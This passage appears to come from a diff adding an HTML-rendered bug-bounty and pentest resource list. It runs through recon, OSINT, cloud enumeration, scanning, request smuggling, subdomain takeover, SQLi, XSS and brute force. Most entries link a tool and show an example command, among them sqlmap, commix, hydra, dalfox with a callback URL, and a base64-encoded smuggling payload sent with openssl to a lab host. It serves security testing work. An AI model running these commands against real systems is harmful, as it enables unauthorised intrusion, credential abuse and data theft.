+ * A simple HTTP Request &amp; Response Service.</p>
+<p>http://pingb.in
+ * Simple DNS and HTTP service for security testing.</p>
+<p>https://github.com/ctxis/SnitchDNS
+ * SnitchDNS is a database driven DNS Server with a Web UI, written in Python and Twisted, that makes DNS administration easier with all configuration changed applied instantly without restarting any system services.</p>
+<p>http://dnslog.cn
+ * Simple DNS server with realitme logs.</p>
+<p>https://interact.projectdiscovery.io/
+ * Interactsh is an Open-Source Solution for Out of band Data Extraction, A tool designed to detect bugs that cause external interactions, For example - Blind SQLi, Blind CMDi, SSRF, etc.</p>
+<p>https://canarytokens.org/
+ * You'll be familiar with web bugs, the transparent images which track when someone opens an email. They work by embedding a unique URL in a page's image tag, and monitoring incoming GET requests.
+ * Imagine doing that, but for file reads, database queries, process executions or patterns in log files. Canarytokens does all this and more, letting you implant traps in your production systems rather than setting up separate honeypots.</p>
+<h2 id="acquisitionsnamesaddressescontactsemailsetc">Acquisitions/Names/Addresses/Contacts/Emails/etc.</h2>
+<p>https://hunter.io
+ * Hunter lets you find email addresses in seconds and connect with the people that matter for your business.</p>
+<p>https://intelx.io
+ * Intelligence X is an independent European technology company founded in 2018 by Peter Kleissner. The company is based in Prague, Czech Republic. Its mission is to develop and maintain the search engine and data archive.</p>
+<p>https://www.nerdydata.com
+ * Find companies based on their website's tech stack or code.</p>
+<p>https://github.com/khast3x/h8mail
+ * h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt's "Collection1" and the infamous "Breach Compilation" torrent.
+<code>h8mail -t target@example.com</code></p>
+<p>https://dashboard.fullcontact.com
+ * Our person-first Identity Resolution Platform provides the crucial intelligence needed to drive Media Amplification, Omnichannel Measurement, and Customer Recognition.</p>
+<p>https://www.peopledatalabs.com
+ * Our data empowers developers to build innovative, trusted data-driven products at scale.</p>
+<p>https://www.social-searcher.com
+ * Free Social Media Search Engine.</p>
+<p>https://github.com/mxrch/GHunt
+ * GHunt is an OSINT tool to extract information from any Google Account using an email.
+<code>python3 ghunt.py email myemail@gmail.com</code></p>
+<h2 id="htmljavascript-comments">HTML/JavaScript Comments</h2>
+<p>https://portswigger.net/support/using-burp-suites-engagement-tools
+ * Burp Engagement Tools</p>
+<h2 id="google-dorks">Google Dorks</h2>
+<p>https://www.exploit-db.com/google-hacking-database
+ * Google Hacking Database</p>
+<ul>
+<li>Search on AWS
+<code>site:amazonaws.com company</code></li>
+</ul>
+<h2 id="content-security-policy-csp">Content Security Policy (CSP)</h2>
+<p>https://csp-evaluator.withgoogle.com/
+ * CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.</p>
+<h2 id="tiny-urls-services">Tiny URLs Services</h2>
+<p>https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research
+ * Cornell Tech Url Shortening Research</p>
+<p>https://github.com/utkusen/urlhunter
+ * urlhunter is a recon tool that allows searching on URLs that are exposed via shortener services such as bit.ly and goo.gl.
+<code>urlhunter -keywords keywords. -date 2020-11-20 -o out.</code></p>
+<p>https://shorteners.grayhatwarfare.com
+ * Search Shortener Urls</p>
+<h2 id="graphql">GraphQL</h2>
+<p>https://github.com/doyensec/graph-ql
+ * A security testing tool to facilitate GraphQL technology security auditing efforts.</p>
+<p>https://hackernoon.com/understanding-graphql-part-1-nxm3uv9
+ * Understanding GraphQL</p>
+<p>https://graphql.org/learn/introspection/
+ * It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!</p>
+<p>https://github.com/nikitastupin/clairvoyance
+ * Obtain GraphQL API schema even if the introspection is disabled.
+<code>clairvoyance https://www.example.com/graphql -o schema.json</code></p>
+<p>https://jondow.eu/practical-graphql-attack-vectors/
+ * Practical GraphQL attack vectors</p>
+<p>https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/
+ * Why and how to disable introspection query for GraphQL APIs</p>
+<p>https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/
+ * Securing GraphQL</p>
+<p>https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4
+ * GraphQL vs REST API model, common security test cases for GraphQL endpoints.</p>
+<p>https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
+ * GraphQL common vulnerabilities &amp; how to exploit them.</p>
+<p>https://cybervelia.com/?p=736
+ * GraphQL exploitation – All you need to know.</p>
+<p>https://portswigger.net/web-security/graphql
+ * GraphQL vulnerabilities generally arise due to implementation and design flaws.</p>
+<p>https://github.com/forcesunseen/graphquail
+ * GraphQuail is a Burp Suite extension that offers a toolkit for testing GraphQL endpoints.</p>
+<p>https://github.com/graphql-kit/graphql-voyager
+ * Represent any GraphQL API as an interactive graph.</p>
+<p>https://github.com/assetnote/batchql
+ * BatchQL is a GraphQL security auditing script with a focus on performing batch GraphQL queries and mutations.</p>
+<h2 id="general">General</h2>
+<p>https://github.com/redhuntlabs/Awesome-Asset-Discovery
+ * Asset Discovery is the initial phase of any security assessment engagement, be it offensive or defensive. With the evolution of information technology, the scope and definition of assets has also evolved.</p>
+<p>https://spyse.com
+ * Spyse holds the largest database of its kind, containing a wide range of OSINT data handy for the reconnaissance.</p>
+<p>https://github.com/yogeshojha/rengine
+ * reNgine is an automated reconnaissance framework meant for information gathering during penetration testing of web applications.</p>
+<p>https://github.com/phor3nsic/favicon_hash_shodan
+ * Search for a framework by favicon</p>
+<p>https://github.com/righettod/website-passive-reconnaissance
+ * Script to automate, when possible, the passive reconnaissance performed on a website prior to an assessment.</p>
+<p>https://dhiyaneshgeek.github.io/red/teaming/2022/04/28/reconnaissance-red-teaming/
+ * Reconnaissance is carried out in a Red Teaming Engagement.</p>
+<p>https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=azure-ad
+ * The List Blobs operation returns a list of the blobs under the specified container.
+<code>https://myaccount.blob.core.windows.net/mycontainer?restype=container&amp;comp=list</code></p>
+<p>https://github.com/hakluke/hakoriginfinder
+ * Tool for discovering the origin host behind a reverse proxy. Useful for bypassing WAFs and other reverse proxies.
+<code>prips 93.184.216.0/24 | hakoriginfinder -h https://example.com:443/foo</code></p>
+<h1 id="enumerating">* Enumerating</h1>
+<h2 id="fingerprint">Fingerprint</h2>
+<p>https://github.com/urbanadventurer/WhatWeb
+ * WhatWeb identifies websites. Its goal is to answer the question, "What is that Website?". WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.
+<code>whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com</code></p>
+<p>https://builtwith.com
+ * Find out what websites are Built With.</p>
+<p>https://www.wappalyzer.com
+ * Identify technologies on websites.</p>
+<p>https://webtechsurvey.com
+ * Discover what technologies a website is built on or find out what websites use a particular web technology.</p>
+<p>https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb
+ * Software Vulnerability Scanner Burp Extension</p>
+<p>https://github.com/GrrrDog/weird_proxies
+ * It's a cheat sheet about behaviour of various reverse proxies and related attacks.</p>
+<h2 id="buckets">Buckets</h2>
+<p>https://aws.amazon.com/cli/
+ * List s3 bucket permissions and keys
+<code>aws s3api get-bucket-acl --bucket examples3bucketname</code>
+<code>aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext</code>
+<code>aws s3api list-objects --bucket examples3bucketname</code>
+<code>aws s3api list-objects-v2 --bucket examples3bucketname</code>
+<code>aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext</code>
+<code>aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext</code></p>
+<p>https://github.com/eth0izzle/bucket-stream
+ * Find interesting Amazon S3 Buckets by watching certificate transparency logs</p>
+<p>https://buckets.grayhatwarfare.com/
+ * Search Public Buckets</p>
+<p>https://github.com/VirtueSecurity/aws-extender
+ * Burp Suite extension which can identify and test S3 buckets</p>
+<h2 id="cloud-enumeration">Cloud Enumeration</h2>
+<ul>
+<li>Basic check
+<code>export AWS_ACCESS_KEY_ID=XYZ</code>
+<code>export AWS_SECRET_ACCESS_KEY=XYZ</code>
+<code>export AWS_SESSION_TOKEN=XYZ</code>
+<code>aws sts get-caller-identity</code></li>
+</ul>
+<p>https://github.com/andresriancho/enumerate-iam
+ * Found a set of AWS credentials and have no idea which permissions it might have?</p>
+<p>https://github.com/nccgroup/ScoutSuite
+ * Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.</p>
+<p>https://github.com/streaak/keyhacks
+ * KeyHacks shows ways in which particular API keys found on a Bug Bounty Program can be used, to check if they are valid.</p>
+<p>https://github.com/ozguralp/gmapsapiscanner
+ * Used for determining whether a leaked/found Google Maps API Key is vulnerable to unauthorized access by other applications or not.</p>
+<p>https://github.com/aquasecurity/trivy
+ * Trivy (tri pronounced like trigger, vy pronounced like envy) is a comprehensive security scanner. It is reliable, fast, extremely easy to use, and it works wherever you need it.</p>
+<p>https://github.com/initstring/cloud_enum
+ * Multi-cloud OSINT tool. Enumerate public resources in AWS, Azure, and Google Cloud.</p>
+<p>https://github.com/toniblyx/prowler
+ * Prowler is an Open Source Security tool for AWS, Azure and GCP to perform Cloud Security best practices assessments, audits, incident response, compliance, continuous monitoring, hardening and forensics readiness.</p>
+<p>https://github.com/salesforce/cloudsplaining
+ * Cloudsplaining is an AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report.</p>
+<p>https://github.com/cloudsploit/scans
+ * CloudSploit by Aqua is an open-source project designed to allow detection of security risks in cloud infrastructure accounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub. These scripts are designed to return a series of potential misconfigurations and security risks.</p>
+<p>https://github.com/RhinoSecurityLabs/pacu
+ * Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments.</p>
+<p>https://github.com/VirtueSecurity/aws-extender
+ * This Burp Suite extension can identify and test S3 buckets as well as Google Storage buckets and Azure Storage containers for common misconfiguration issues using the boto/boto3 SDK library.</p>
+<p>https://github.com/irgoncalves/gcp_security
+ * This repository is intented to have Google Cloud Security recommended practices, scripts and more.</p>
+<p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
+ * Instance metadata is data about your instance that you can use to configure or manage the running instance. Instance metadata is divided into categories, for example, host name, events, and security groups.</p>
+<p>https://cloud.google.com/compute/docs/storing-retrieving-metadata
+ * Every instance stores its metadata on a metadata server. You can query this metadata server programmatically, from within the instance and from the Compute Engine API. You can query for information about the instance, such as the instance's host name, instance ID, startup and shutdown scripts, custom metadata, and service account information. Your instance automatically has access to the metadata server API without any additional authorization.</p>
+<p>https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
+ * The Azure Instance Metadata Service (IMDS) provides information about currently running virtual machine instances. You can use it to manage and configure your virtual machines. This information includes the SKU, storage, network configurations, and upcoming maintenance events.</p>
+<p>https://www.alibabacloud.com/help/doc-detail/49122.htm
+ * Metadata of an instance includes basic information of the instance in Alibaba Cloud, such as the instance ID, IP address, MAC addresses of network interface controllers (NICs) bound to the instance, and operating system type.</p>
+<p>https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
+ * Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments.</p>
+<p>https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/cognito-user-pools
+ * A user pool is a user directory in Amazon Cognito. With a user pool, your users can sign in to your web or mobile app through Amazon Cognito, or federate through a third-party identity provider (IdP). Whether your users sign in directly or through a third party, all members of the user pool have a directory profile that you can access through an SDK.</p>
+<p>https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/
+ * This post gives a deep dive into a critical security flaw that was present in Flickr’s login flow.</p>
+<p>https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p1/
+https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2/
+ * Attacking AWS Cognito with Pacu.</p>
+<h2 id="containerization">Containerization</h2>
+<p>https://github.com/stealthcopter/deepce
+ * Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE).</p>
+<h2 id="visual-identification">Visual Identification</h2>
+<p>https://github.com/FortyNorthSecurity/EyeWitness
+ * EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
+<code>eyewitness --web --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" --threads 10 --timeout 30 --prepend-https -f "${PWD}/subdomains." -d "${PWD}/eyewitness/"</code></p>
+<p>https://github.com/michenriksen/aquatone
+ * Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
+<code>cat targets. | aquatone</code></p>
+<p>https://github.com/sensepost/gowitness
+ * gowitness is a website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results. Both Linux and macOS is supported, with Windows support mostly working.
+<code>gowitness scan --cidr 192.168.0.0/24 --threads 20</code></p>
+<p>https://github.com/BishopFox/eyeballer
+ * Eyeballer is meant for large-scope network penetration tests where you need to find "interesting" targets from a huge set of web-based hosts.
+<code>eyeballer.py --weights YOUR_WEIGHTS.h5 predict PATH_TO/YOUR_FILES/</code></p>
+<h1 id="scanning">* Scanning</h1>
+<h2 id="static-application-security-testing">Static Application Security Testing</h2>
+<p>https://github.com/returntocorp/semgrep
+ * Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.</p>
+<p>https://owasp.org/www-project-dependency-check/
+ * Dependency-Check is a Software Composition Analysis (SCA) tool that attempts to detect publicly disclosed vulnerabilities contained within a project’s dependencies. It does this by determining if there is a Common Platform Enumeration (CPE) identifier for a given dependency. If found, it will generate a report linking to the associated CVE entries.</p>
+<p>https://owasp.org/www-community/Source_Code_Analysis_Tools
+ * Source code analysis tools, also known as Static Application Security Testing (SAST) Tools, can help analyze source code or compiled versions of code to help find security flaws.</p>
+<p>https://github.com/robotframework/robotframework
+ * Robot Framework is a generic open source automation framework for acceptance testing, acceptance test driven development (ATDD), and robotic process automation (RPA). It has simple plain text syntax and it can be extended easily with generic and custom libraries.</p>
+<p>https://github.com/google/osv-scanner
+ * Use OSV-Scanner to find existing vulnerabilities affecting your project's dependencies.</p>
+<p>https://github.com/securego/gosec
+ * Inspects source code for security problems by scanning the Go AST.</p>
+<p>https://dotnetfiddle.net
+ * We are a group of .NET developers who are sick and tired of starting Visual Studio, creating a new project and running it, just to test simple code or try out samples from other developers.</p>
+<p>https://jsfiddle.net
+ * Test your JavaScript, CSS, HTML or CoffeeScript online with JSFiddle code editor.</p>
+<h2 id="dependency-confusion">Dependency Confusion</h2>
+<p>https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
+ * How I Hacked Into Apple, Microsoft and Dozens of Other Companies.</p>
+<p>https://www.blazeinfosec.com/post/dependency-confusion-exploitation/
+ * This blog post provides an overview of Dependency Confusion attacks and explains in detail how they can be exploited in the wild, with examples using NPM packages and tips to prevent these vulnerabilities from occurring.</p>
+<p>https://github.com/dwisiswant0/nodep
+ * nodep check available dependency packages across npmjs, PyPI or RubyGems registry.</p>
+<p>https://github.com/visma-prodsec/confused
+ * A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements., JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.</p>
+<h2 id="send-emails">Send Emails</h2>
+<p>https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
+ * Ticket Trick</p>
+<p>https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2
+ * Abusing autoresponders and email bounces</p>
+<ul>
+<li>Send multiple emails
+<code>while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done &lt; emails.</code></li>
+</ul>
+<h2 id="search-vulnerabilities">Search Vulnerabilities</h2>
+<p>https://pypi.org/project/urlscanio/
+ * URLScan.io is a useful tool for scanning and obtaining information from potentially malicious websites. The creators of URLScan have very helpfully made an API which can be used to add some automation to your workflow. urlscanio is a simple Python CLI utility which makes use of the aforementioned APIs to automate my own personal workflow when it comes to using URLScan.
+<code>urlscanio -i https://www.example.com</code></p>
+<p>https://github.com/vulnersCom/getsploit
+ * Command line search and download tool for Vulners Database inspired by searchsploit.
+<code>getsploit wordpress 4.7.0</code></p>
+<p>https://www.exploit-db.com/searchsploit
+ * Included in our Exploit Database repository on GitHub is searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go.
+<code>searchsploit -t oracle windows</code></p>
+<p>https://github.com/vulmon/Vulmap
+ * Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.</p>
+<p>https://grep.app
+ * Search across a half million git repos.</p>
+<p>https://github.com/0ang3el/aem-hacker
+ * Tools to identify vulnerable Adobe Experience Manager (AEM) webapps.
+<code>python3 aem_hacker.py -u https://example.com --host your_vps_hostname_ip</code></p>
+<p>https://github.com/laluka/jolokia-exploitation-toolkit
+ * Jolokia Exploitation Toolkit (JET) helps exploitation of exposed jolokia endpoints.</p>
+<p>https://github.com/cve-search/git-vuln-finder
+ * Finding potential software vulnerabilities from git commit messages.
+<code>git-vuln-finder -r ~/git/curl | jq .</code></p>
+<p>https://github.com/internetwache/GitTools
+ * This repository contains three small python/bash scripts used for the Git research.</p>
+<h2 id="web-scanning">Web Scanning</h2>
+<p>https://github.com/psiinon/open-source-web-scanners
+ * A list of open source web security scanners on GitHub.</p>
+<p>https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner
+ * Burp Scanner is a tool for automatically finding security vulnerabilities in web applications.</p>
+<p>https://github.com/spinkham/skipfish
+ * Skipfish is an active web application security reconnaissance tool.
+<code>skipfish -MEU -S dictionaries/minimal.wl -W new_dict.wl -C "AuthCookie=value" -X /logout.aspx -o output_dir http://www.example.com/</code></p>
+<p>https://github.com/sullo/nikto
+ * Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.
+<code>nikto -ssl -host www.example.com</code></p>
+<p>https://github.com/wpscanteam/wpscan
+ * WordPress Security Scanner
+<code>wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com</code></p>
+<p>https://github.com/droope/droopescan
+ * A plugin-based scanner that aids security researchers in identifying issues with several CMS.
+<code>droopescan scan drupal -u example.com</code></p>
+<p>https://github.com/projectdiscovery/nuclei
+ * Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.
+<code>nuclei -l urls. -t cves/ -t files/ -o results.</code></p>
+<p>https://github.com/six2dez/reconftw
+ * reconFTW is a tool designed to perform automated recon on a target domain by running the best set of tools to perform enumeration and finding out vulnerabilities.
+<code>reconftw.sh -d target.com -a</code></p>
+<p>https://gobies.org
+ * The new generation of network security technology achieves rapid security emergency through the establishment of a complete asset database for the target.</p>
+<p>https://github.com/commixproject/commix
+ * By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or HTTP header.
+<code>python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&amp;Submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"</code></p>
+<p>https://github.com/MrCl0wnLab/ShellShockHunter
+ * Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014.
+<code>python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl</code></p>
+<p>https://github.com/crashbrz/WebXmlExploiter/
+ * The WebXmlExploiter is a tool to exploit exposed by misconfiguration or path traversal web.xml files.</p>
+<p>https://github.com/stark0de/nginxpwner
+ * Nginxpwner is a simple tool to look for common Nginx misconfigurations and vulnerabilities.</p>
+<p>https://adityaksood.medium.com/sparty-useful-tools-die-hard-d9afe6f3f561
+https://github.com/adityaks/sparty
+ * Sparty is an open source tool written in python to audit web applications using sharepoint and frontpage architecture.</p>
+<h2 id="http-request-smuggling">HTTP Request Smuggling</h2>
+<p>https://github.com/defparam/smuggler
+ * An HTTP Request Smuggling / Desync testing tool written in Python 3.
+<code>python3 smuggler.py -q -u https://example.com/</code></p>
+<ul>
+<li>Attacking through command line a HTTPS vulnerable service. Good for persistence when no one believes in you.
+<code>echo 'UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiB5b3VyLWxhYi1pZC53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNg0KVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQNCg0KMA0KDQpH' | base64 -d | timeout 1 openssl s_client -quiet -connect your-lab-id.web-security-academy.net:443 &amp;&gt;/dev/null</code></li>
+</ul>
+<p>https://github.com/neex/http2smugl
+ * This tool helps to detect and exploit HTTP request smuggling in cases it can be achieved via HTTP/2 -&gt; HTTP/1.1 conversion by the frontend server.
+<code>http2smugl detect https://example.com/</code></p>
+<p>https://github.com/BishopFox/h2csmuggler
+ * h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.
+<code>h2csmuggler.py -x https://example.com/ --test</code></p>
+<p>https://github.com/0ang3el/websocket-smuggle
+ * Smuggling HTTP requests over fake WebSocket connection.
+<code>python3 smuggle.py -u https://example.com/</code></p>
+<p>https://github.com/anshumanpattnaik/http-request-smuggling
+ * So the idea behind this security tool is to detect HRS vulnerability for a given host and the detection happens based on the time delay technique with the given permutes.</p>
+<p>https://portswigger.net/web-security/request-smuggling
+ * HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.</p>
+<p>https://github.com/PortSwigger/http-request-smuggler
+ * This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks, originally created during HTTP Desync Attacks research. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.</p>
+<p>https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
+ * This is how I was able to exploit a HTTP Request Smuggling in some Mobile Device Management (MDM) servers and send any MDM command to any device enrolled on them for a private bug bounty program.</p>
+<p>https://www.intruder.io/research/practical-http-header-smuggling
+ * Modern web applications typically rely on chains of multiple servers, which forward HTTP requests to one another. The attack surface created by this forwarding is increasingly receiving more attention, including the recent popularisation of cache poisoning and request smuggling vulnerabilities. Much of this exploration, especially recent request smuggling research, has developed new ways to hide HTTP request headers from some servers in the chain while keeping them visible to others – a technique known as "header smuggling". This paper presents a new technique for identifying header smuggling and demonstrates how header smuggling can lead to cache poisoning, IP restriction bypasses, and request smuggling.</p>
+<p>https://docs.google.com/presentation/d/1DV-VYkoEsjFsePPCmzjeYjMxSbJ9PUH5EIN2ealhr5I/
+ * Two Years Ago @albinowax Shown Us A New Technique To PWN Web Apps So Inspired By This Technique AND @defparam's Tool , I Have Been Collecting A Lot Of Mutations To Achieve Request Smuggling.</p>
+<p>https://github.com/GrrrDog/weird_proxies
+ * It's a cheat sheet about behaviour of various reverse proxies and related attacks.</p>
+<p>https://github.com/bahruzjabiyev/T-Reqs-HTTP-Fuzzer
+ * T-Reqs (Two Requests) is a grammar-based HTTP Fuzzer written as a part of the paper titled "T-Reqs: HTTP Request Smuggling with Differential Fuzzing" which was presented at ACM CCS 2021.</p>
+<p>https://github.com/BenjiTrapp/http-request-smuggling-lab
+ * Two HTTP request smuggling labs.</p>
+<p>https://infosec.zeyu2001.com/2022/http-request-smuggling-in-the-multiverse-of-parsing-flaws
+ * Nowadays, novel HTTP request smuggling techniques rely on subtle deviations from the HTTP standard. Here, I discuss some of my recent findings and novel techniques.</p>
+<h2 id="subdomain-takeover">Subdomain Takeover</h2>
+<p>https://github.com/anshumanbh/tko-subs
+ * Subdomain Takeover Scanner
+<code>tko-subs -data providers-data.csv -threads 20 -domains subdomains.</code></p>
+<p>https://github.com/haccer/subjack
+ * Subjack is a Subdomain Takeover tool written in Go designed to scan a list of subdomains concurrently and identify ones that are able to be hijacked.
+<code>subjack -w subdomains. -t 100 -timeout 30 -o results. -ssl</code></p>
+<p>https://github.com/Ice3man543/SubOver
+ * Subover is a Hostile Subdomain Takeover tool originally written in python but rewritten from scratch in Golang. Since it's redesign, it has been aimed with speed and efficiency in mind.
+<code>SubOver -l subdomains.</code></p>
+<p>https://github.com/punk-security/dnsReaper
+ * DNS Reaper is yet another sub-domain takeover tool, but with an emphasis on accuracy, speed and the number of signatures in our arsenal.
+<code>python3 main.py file --filename subdomains.</code></p>
+<h2 id="sqli-sql-injection">SQLi (SQL Injection)</h2>
+<p>https://github.com/sqlmapproject/sqlmap
+ * sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
+<code>sqlmap --force-ssl -r RAW_REQUEST. --user-agent='Mozilla' --batch</code>
+<code>sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch</code></p>
+<h2 id="xss">XSS</h2>
+<p>https://github.com/hahwul/dalfox
+ * DalFox is a powerful open-source tool that focuses on automation, making it ideal for quickly scanning for XSS flaws and analyzing parameters. Its advanced testing engine and niche features are designed to streamline the process of detecting and verifying vulnerabilities.
+<code>dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&amp;artist\=123\&amp;asdf\=ff -b https://your-callback-url</code></p>
+<p>https://github.com/KathanP19/Gxss
+ * A Light Weight Tool for checking reflecting Parameters in a URL. Inspired by kxss by @tomnomnom.
+<code>echo "https://www.example.com/some.php?first=hello&amp;last=world" | Gxss -c 100</code></p>
+<h2 id="repositories-scanning">Repositories Scanning</h2>
+<p>https://github.com/zricethezav/gitleaks
+ * Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.</p>
+<p>https://github.com/michenriksen/gitrob
+ * Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github.</p>
+<p>https://github.com/dxa4481/truffleHog
+ * Searches through git repositories for secrets, digging deep into commit history and branches.</p>
+<p>https://github.com/awslabs/git-secrets
+ * Prevents you from committing passwords and other sensitive information to a git repository.</p>
+<p>https://github.com/eth0izzle/shhgit
+ * shhgit helps secure forward-thinking development, operations, and security teams by finding secrets across their code before it leads to a security breach.</p>
+<p>https://pinatahub.incognita.tech/
+ * PinataHub allows you to explore a fraction of the 4M+ passwords and secrets committed in public GitHub repositories, detected by GoldDigger.</p>
+<p>https://github.com/adamtlangley/gitscraper
+ * A tool which scrapes public github repositories for common naming conventions in variables, folders and files.
+<code>php gitscraper.php {GitHub Username} {GitHub Personal KEY}</code></p>
+<p>https://www.gitguardian.com/
+ * Secure your software development lifecycle with enterprise-grade secrets detection. Eliminate blind spots with our automated, battle-tested detection engine.</p>
+<p>https://docs.gitguardian.com/secrets-detection/detectors/supported_credentials
+ * Here is an exhaustive list of the detectors supported by GitGuardian.</p>
+<h2 id="secret-scanning">Secret Scanning</h2>
+<p>https://github.com/redhuntlabs/HTTPLoot
+ * An automated tool which can simultaneously crawl, fill forms, trigger error/debug pages and "loot" secrets out of the client-facing code of sites.</p>
+<p>https://github.com/redhuntlabs/BucketLoot
+ * BucketLoot is an automated S3-compatible Bucket inspector that can help users extract assets, flag secret exposures and even search for custom keywords as well as Regular Expressions from publicly-exposed storage buckets by scanning files that store data in plain-text.</p>
+<p>https://github.com/0xTeles/jsleak
+ * jsleak is a tool to identify sensitive data in JS files through regex patterns.</p>
+<p>https://github.com/channyein1337/jsleak
+ * I was developing jsleak during most of my free time for my own need. It is easy-to-use command-line tool designed to uncover secrets and links in JavaScript files or source code. The jsleak was inspired by Linkfinder and regexes are collected from multiple sources.</p>
+<h2 id="google-dorks-scanning">Google Dorks Scanning</h2>
+<p>https://github.com/opsdisk/pagodo
+ * The goal of this project was to develop a passive Google dork script to collect potentially vulnerable web pages and applications on the Internet.
+<code>python3 pagodo.py -d example.com -g dorks. -l 50 -s -e 35.0 -j 1.1</code></p>
+<h2 id="cors-misconfigurations">CORS Misconfigurations</h2>
+<p>https://github.com/s0md3v/Corsy
+ * Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations.
+<code>python3 corsy.py -u https://example.com</code></p>
+<h1 id="monitoring">* Monitoring</h1>
+<h2 id="cve">CVE</h2>
+<p>https://www.opencve.io/
+ * OpenCVE (formerly known as Saucs.com) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.</p>
+<h1 id="attacking">* Attacking</h1>
+<h2 id="brute-force">Brute Force</h2>
+<p>https://github.com/vanhauser-thc/thc-hydra
+ * Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.
+<code>hydra -l root -P 10-million-password-list-top-1000. www.example.com -t 4 ssh</code></p>
